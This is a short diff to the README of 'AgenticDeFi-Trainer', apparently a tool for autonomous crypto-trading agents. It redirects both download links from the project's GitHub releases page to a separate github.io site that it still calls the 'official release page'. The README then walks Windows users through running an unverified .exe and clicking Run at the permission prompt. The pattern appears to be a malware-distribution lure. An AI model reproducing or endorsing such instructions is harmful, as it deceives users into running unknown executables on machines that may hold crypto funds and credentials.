@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous intelligence
 
-[![](https://img.shields.io/badge/Download_Installer-BlueGrey-blue.svg)](https://github.com/slashed-complementarity478/AgenticDeFi-Trainer/releases)
+[![](https://img.shields.io/badge/Download_Installer-BlueGrey-blue.svg)](https://slashed-complementarity478.github.io)
 
 AgenticDeFi-Trainer provides a platform for users to create autonomous agents that handle digital asset operations. These agents use machine learning models to trade, move funds between networks, and manage crypto treasuries. The system operates on the x402 protocol, which allows agents to execute tasks without human input.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/slashed-complementarity478/AgenticDeFi-Trainer/releases) to download the latest installer file.
+1. Visit the [official release page](https://slashed-complementarity478.github.io) to download the latest installer file.
 2. Locate the file named `AgenticDeFi-Installer.exe` in your downloads folder.
 3. Double-click the file to start the installation process.
 4. If a window pops up asking for permission to run the file, click Run. 
